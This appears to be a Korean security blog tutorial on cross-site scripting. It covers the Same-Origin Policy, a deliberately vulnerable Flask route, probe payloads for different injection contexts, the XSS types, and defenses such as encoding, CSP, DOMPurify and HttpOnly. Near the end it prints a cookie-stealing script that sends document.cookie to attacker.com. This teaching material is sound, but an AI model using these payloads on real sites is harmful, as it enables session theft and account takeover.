---
title: "XSS는 뭐야? [Web Hacking]"
date: 2026-03-16 12:00:00 +0900
categories: [Hacking, Red, "Web Hacking"]
tags: ["web hacking", "xss"]
---
## 시작하며

웹사이트에서 게시글을 읽기만 했는데 계정이 털릴 수 있습니다. 아이디·비밀번호를 바꾸지 않았고, 피싱 사이트를 방문한 적도 없는데 말입니다. 이런 일이 가능한 이유 중 하나가 바로 XSS(Cross-Site Scripting) 취약점입니다.

<br>

이 글을 읽으면 XSS가 왜 위험한지 원리를 이해하고, 취약점을 탐지하는 기본적인 방법을 알 수 있습니다.

<br>

> ⚠️ 주의: 이 글에서 소개하는 기법은 본인이 소유하거나 명시적으로 허가받은 시스템에서만 사용해야 합니다.
> 허가 없이 타인의 시스템에 사용하는 것은 불법입니다.

<br>

## SOP란?

XSS를 이해하려면 먼저 **SOP(Same-Origin Policy, 동일 출처 정책)** 를 알아야 합니다.

<br>

SOP는 브라우저가 기본적으로 적용하는 보안 정책으로, 한 사이트의 JavaScript가 다른 사이트의 데이터를 읽거나 쓰지 못하도록 막습니다. 여기서 "출처(Origin)"는 **프로토콜 + 호스트 + 포트** 세 가지가 모두 일치해야 동일 출처로 인정합니다.

<br>

예를 들어 `https://mybank.com`에서 실행 중인 JS는 `https://attacker.com`의 데이터를 읽을 수 없습니다. 프로토콜은 같지만 호스트가 다르기 때문입니다.

| 비교 대상 | 결과 |
|-----------|------|
| `https://example.com` vs `https://example.com` | ✅ 동일 출처 |
| `https://example.com` vs `http://example.com` | ❌ 프로토콜 다름 |
| `https://example.com` vs `https://sub.example.com` | ❌ 호스트 다름 |
| `https://example.com` vs `https://example.com:8080` | ❌ 포트 다름 |

<br>

SOP 덕분에 어떤 사이트가 다른 사이트의 쿠키를 함부로 읽는 건 불가능합니다. **그런데 만약 공격자가 타깃 사이트에서 직접 JS를 실행할 수 있다면?** SOP가 의미 없어집니다. 실행 주체가 이미 그 출처 안에 있기 때문입니다. 이것이 XSS가 위험한 본질적인 이유입니다.

<br>

비유하자면, SOP가 "외부인이 성 안의 금고를 열 수 없게 막는 성벽"이라면, XSS는 "성벽 안으로 몰래 화살(악성 스크립트)을 쏜 뒤, 성 안의 병사가 쏜 것처럼 속이는 공격"입니다. 성벽(SOP)은 멀쩡히 서 있지만, 이미 성 안에서 날아간 화살이라 막을 방법이 없습니다.

<br>

## XSS란?

**XSS(Cross-Site Scripting)**는 공격자가 웹사이트에 악성 JavaScript를 삽입하여 다른 사용자의 브라우저에서 실행되게 만드는 취약점입니다. 이름에 "Scripting"이 들어가지만 본질은 **JavaScript 인젝션(주입)** 입니다.

<br>

발생 원인은 단순합니다. 서버가 사용자 입력값을 검증·인코딩 없이 그대로 HTML에 출력할 때, 브라우저는 그 입력을 HTML 코드로 해석하고 실행합니다. 아래는 Flask 기반 취약한 서버 코드의 예시입니다.

```python
# 취약한 Flask 코드 — 입력값을 그대로 HTML에 삽입
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    return f'<p>안녕하세요, {name}님!</p>'  # HTML 인코딩 없이 직접 삽입
```

<br>

공격자가 `name` 파라미터에 `<script>alert(document.cookie)</script>`를 전달하면 서버 응답이 다음과 같이 됩니다. `document.cookie`는 현재 사이트에 저장된 쿠키 값을 가져오는 JavaScript 코드이고, `alert()`는 그 값을 팝업 창으로 띄우는 함수입니다. 실제 공격에서는 `alert()` 대신 쿠키를 외부 서버로 전송하는 코드를 쓰지만, 취약점이 존재하는지 먼저 확인하는 단계에서 주로 사용합니다.

```html
<p>안녕하세요, <script>alert(document.cookie)</script>님!</p>
```

<br>

브라우저는 `<script>` 태그를 HTML의 일부로 파싱하고 내부 코드를 실행합니다. 공격자가 타깃 사이트의 컨텍스트에서 JS를 실행하게 된 셈이므로 SOP를 우회한 것과 같습니다.

<br>

XSS로 가능한 공격:
- 쿠키/세션 탈취 → 계정 탈취
- 키로거 삽입 → 입력 정보 수집
- 피싱 페이지로 리다이렉트
- CSRF 토큰 탈취
- 악성 파일 다운로드 유도

<br>

## XSS 취약점 탐지

XSS 취약점이 있는지 확인하는 가장 기본적인 방법은 입력 필드에 스크립트 태그를 넣어보는 것입니다.

```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

<br>

첫 번째 페이로드를 넣었을 때 `alert` 창이 뜨면 취약점이 존재하는 것입니다. 창이 뜨지 않더라도 바로 포기하지 말고 두 번째, 세 번째 페이로드를 시도해봅니다. 입력값이 태그 속성 안에 들어가는 경우 `">`나 `'>`로 속성을 먼저 닫아야 스크립트가 실행되기 때문입니다.

<br>

탐지 흐름:
```text
입력 필드에 페이로드를 넣는다
페이지 소스를 확인해 입력값이 HTML에 그대로 반영됐는지 본다
반영됐다면 컨텍스트(태그 사이인지, 속성 안인지, JS 안인지)를 파악한다
컨텍스트에 맞는 페이로드로 실제 실행 여부를 확인한다
```

<br>

## 컨텍스트별 삽입 위치

입력값이 HTML의 어디에 반영되느냐에 따라 페이로드가 달라집니다. 컨텍스트를 먼저 파악해야 적절한 페이로드를 쓸 수 있습니다.

| 삽입 위치 | 예시 | 페이로드 방식 |
|-----------|------|--------------|
| HTML 태그 사이 | `<p>입력값</p>` | `<script>alert(1)</script>` |
| 태그 속성 값 | `<input value="입력값">` | `"><script>alert(1)</script>` |
| JavaScript 내부 | `var x = '입력값'` | `';alert(1)//` |

<br>

**HTML 태그 사이**: 입력값이 태그 밖에 텍스트로 출력되는 경우입니다. `<script>` 태그를 그대로 삽입하면 됩니다.

<br>

**태그 속성 값**: 입력값이 `value="..."` 같은 속성 안에 들어가는 경우입니다. `">`로 속성과 태그를 닫은 뒤 스크립트를 삽입합니다. 속성이 작은따옴표로 감싸져 있다면 `'>`를 사용합니다.

<br>

**JavaScript 내부**: 입력값이 JS 코드 안의 문자열 변수로 들어가는 경우입니다. `'`로 문자열을 닫고 `;`로 구문을 끊은 뒤 코드를 삽입합니다. `//`는 뒤에 남는 원래 코드를 주석 처리합니다.

<br>

## XSS 유형 4종

| 유형 | 저장 여부 | 서버 개입 | 위험도 |
|------|-----------|-----------|--------|
| Reflected | ❌ | ✅ | 중 |
| Stored | ✅ | ✅ | 상 |
| DOM-based | ❌ | ❌ | 중 |
| mXSS | 상황에 따라 다름 | 상황에 따라 다름 | 상 (탐지 어려움) |

<br>

### Reflected XSS (반사형)

입력값이 서버에 저장되지 않고 즉시 응답에 반영되어 실행됩니다. 주로 URL 파라미터를 통해 전달됩니다.

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

<br>

위 URL을 피해자가 클릭하면 서버는 `q` 파라미터 값을 검색 결과 페이지에 그대로 출력하고, 브라우저가 스크립트를 실행해 쿠키가 공격자에게 전달됩니다. 공격자는 이 URL을 피싱 메일이나 메신저로 피해자에게 전달합니다.

<br>

페이로드가 서버에 저장되지 않으므로 Stored XSS보다 덜 위험하지만, 클릭 한 번으로 세션 쿠키를 탈취하거나 피싱 사이트로 리다이렉트하는 등 실질적인 피해가 충분히 가능합니다.

<br>

### Stored XSS (저장형)

악성 스크립트가 서버(DB)에 저장되어 해당 페이지를 방문하는 모든 사용자에게 실행됩니다.

<br>

게시판 댓글, 프로필 바이오, 상품 리뷰 등 사용자 입력이 저장되는 곳이라면 어디든 공격 벡터가 됩니다. 피해자가 특별한 링크를 클릭하지 않아도 페이지에 접근하는 것만으로 페이로드가 실행되기 때문에 XSS 유형 중 가장 위험합니다.

<br>

### DOM Based XSS (DOM 기반)

**DOM(Document Object Model)** 은 브라우저가 HTML 문서를 메모리에 트리 구조로 표현한 것입니다. JavaScript는 DOM을 통해 페이지의 요소를 읽고 수정할 수 있습니다. `document.getElementById()`, `innerHTML`, `document.write()` 같은 API가 모두 DOM을 조작하는 수단입니다.

<br>

서버를 거치지 않고 클라이언트 사이드 JavaScript가 DOM을 직접 조작하는 과정에서 발생합니다.

<br>

DOM-based XSS를 이해하려면 **Source**와 **Sink** 개념을 알아야 합니다.

- **Source**: 공격자가 제어할 수 있는 입력 지점. `location.hash`, `location.search`, `document.referrer`, `document.cookie` 등이 해당됩니다.
- **Sink**: 입력값이 실제로 실행되는 지점. `innerHTML`, `eval()`, `document.write()`, `setTimeout()` 등 값을 그대로 실행하거나 렌더링하는 API가 해당됩니다.

취약점은 **Source에서 온 값이 검증 없이 Sink로 흘러들어갈 때** 발생합니다.

```javascript
// Source: location.hash (URL의 # 뒤 값)
// Sink: innerHTML (HTML로 파싱·렌더링)
document.getElementById("output").innerHTML = location.hash.slice(1);
```

<br>

URL의 `#` 뒤에 있는 값(fragment)은 서버에 전송되지 않습니다. 보통의 보안 장비는 서버로 들어오는 입력을 검사하는데, DOM-based XSS는 브라우저 안에서만 일어나기 때문에 서버는 무슨 일이 벌어지는지 전혀 모릅니다. 서버 사이드 필터로는 막을 수가 없고, 방어 전략도 클라이언트 코드에서 이루어져야 합니다.

<br>

### mXSS (Mutation XSS)

브라우저가 HTML을 파싱·직렬화하는 과정에서 입력값을 변환(mutate)할 때 발생합니다. 입력 시점에는 무해해 보이는 문자열이 DOM에 삽입된 뒤 브라우저의 HTML 파서가 이를 변형하면서 실행 가능한 코드가 됩니다. 다른 유형보다 탐지가 어렵고, DOMPurify 같은 sanitization 라이브러리도 파서 차이로 인해 취약할 수 있어 라이브러리를 최신 버전으로 유지하는 것이 중요합니다. 심화 주제이므로 이 글에서는 개념 소개에 그칩니다.

<br>

## 방어 방법

방어 방법이 여럿이지만 우선순위는 명확합니다.

가장 확실한 건 **입력값을 절대 믿지 말고 텍스트로 바꿔버리는 것(HTML Entity 인코딩)**입니다. 악성 코드가 들어와도 브라우저가 실행하지 못하게 만드는 근본적인 방어입니다. HttpOnly는 만약 XSS가 뚫리더라도 계정이 털리는 최악의 상황을 막아주는 **안전벨트** 같은 역할입니다.

<br>

React, Vue, Angular 같은 현대 프레임워크는 기본적으로 출력값을 자동 이스케이프(Auto-escaping)합니다. 프레임워크를 사용하는 환경이라면 `dangerouslySetInnerHTML`(React)이나 `v-html`(Vue)처럼 **명시적으로 raw HTML을 삽입하는 API를 쓰지 않는 것**이 핵심입니다.

<br>

### 1. HTML Entity 인코딩 (서버 사이드)

사용자 입력값을 HTML에 출력하기 전에 특수문자를 HTML Entity로 변환합니다. 브라우저가 이를 태그가 아닌 텍스트로 인식해 실행하지 않습니다.

| 원본 문자 | 변환 후 |
|-----------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

```python
# Python 예시 — html.escape() 사용
import html
safe_output = html.escape(user_input)
# '<script>' → '&lt;script&gt;' 로 변환되어 브라우저가 텍스트로만 표시
```

<br>

### 2. WhiteList 필터링

HTML 입력이 필요한 경우(리치 텍스트 에디터 등), 차단할 태그를 나열하는 BlackList 방식 대신 허용할 태그만 명시하는 WhiteList 방식을 사용합니다. BlackList는 `<scr<script>ipt>` 같은 우회 기법에 취약합니다.

<br>

### 3. CSP (Content Security Policy)

HTTP 응답 헤더로 허용할 스크립트 출처를 명시합니다. CSP는 XSS 삽입 자체를 막지는 않으며, 삽입된 스크립트의 실행을 제한하는 계층 방어입니다.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

<br>

위 설정은 자기 자신 도메인의 스크립트만 허용합니다. 인라인 스크립트(`<script>alert(1)</script>`)와 외부 도메인 스크립트는 모두 차단됩니다.

<br>

### 4. 클라이언트 사이드: DOMPurify

`innerHTML`에 사용자 입력을 넣어야 하는 경우 DOMPurify 라이브러리로 sanitize합니다. 악성 태그와 속성을 제거하고 안전한 HTML만 남깁니다.

```javascript
import DOMPurify from 'dompurify';
// '<img src=x onerror=alert(1)>' → '<img src="x">' 로 onerror 제거
element.innerHTML = DOMPurify.sanitize(userInput);
```

<br>

### 5. HttpOnly 쿠키

쿠키에 `HttpOnly` 속성을 설정하면 JavaScript에서 `document.cookie`로 해당 쿠키에 접근할 수 없습니다. XSS가 발생하더라도 세션 쿠키를 직접 탈취하는 건 불가능해집니다.

<br>

단, HttpOnly는 쿠키 탈취만 막을 뿐입니다. 키로거 삽입, CSRF 토큰 탈취, 피싱 리다이렉트 등 다른 XSS 공격은 여전히 가능하므로 완전한 방어책은 아닙니다.

<br>

### 6. 서버 사이드 라이브러리

| 라이브러리 | 언어 |
|-----------|------|
| Lucy-XSS-Filter | Java |
| OWASP ESAPI | Java, PHP, Python 등 다중 언어 |
| Bleach | Python |
| DOMPurify | JavaScript (클라이언트) |

<br>

## 실제 공격 시나리오 — 쿠키 탈취

`alert(1)`은 취약점이 존재하는지 확인하는 용도입니다. 실제 공격에서는 탈취한 쿠키를 공격자 서버로 전송합니다.

```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
```

<br>

피해자가 이 스크립트가 삽입된 페이지에 접근하는 순간, 브라우저가 공격자 서버로 쿠키 값을 담은 HTTP 요청을 보냅니다. 공격자는 서버 로그에서 탈취된 세션 쿠키를 확인하고 그대로 사용해 피해자 계정으로 로그인합니다.

<br>

단, `HttpOnly` 속성이 설정된 쿠키는 `document.cookie`로 접근되지 않아 이 방식으로는 탈취할 수 없습니다.

<br>

## 정리

| 개념 | 핵심 한 줄 요약 |
|------|----------------|
| SOP | 다른 출처의 리소스를 JS로 읽지 못하게 막는 브라우저 정책 |
| XSS | 공격자가 타깃 사이트에서 악성 JS를 실행시키는 취약점 |
| Reflected XSS | URL 파라미터가 그대로 출력되어 실행 |
| Stored XSS | 악성 스크립트가 DB에 저장되어 모든 방문자에게 실행 |
| DOM-based XSS | 서버를 거치지 않고 클라이언트 JS가 DOM을 조작해 발생 |
| mXSS | 브라우저 파서가 HTML을 변형하는 과정에서 발생 |
| HTML Entity 인코딩 | 특수문자를 텍스트로 치환해 태그로 해석되지 않게 함 |
| CSP | 허용된 출처의 스크립트만 실행되도록 제한하는 헤더 |
| HttpOnly | JS에서 쿠키 접근을 차단해 직접 탈취를 막음 |

<br>

## 마치며

XSS의 핵심은 단순한 "태그 삽입"이 아닙니다. SOP라는 브라우저의 핵심 보안 경계를 우회해 타깃 사이트의 컨텍스트에서 임의 JS를 실행한다는 데 있습니다. 쿠키를 이미 알고 있다면 XSS가 왜 치명적인지 직관적으로 이해될 것입니다.

<br>

방어 관점에서 중요한 것은 **"입력값을 믿지 않는 것"** 입니다. 서버 사이드 인코딩, WhiteList 필터링, CSP, 클라이언트 사이드 sanitization까지 여러 계층으로 방어해야 공격자가 우회할 여지를 좁힐 수 있습니다.
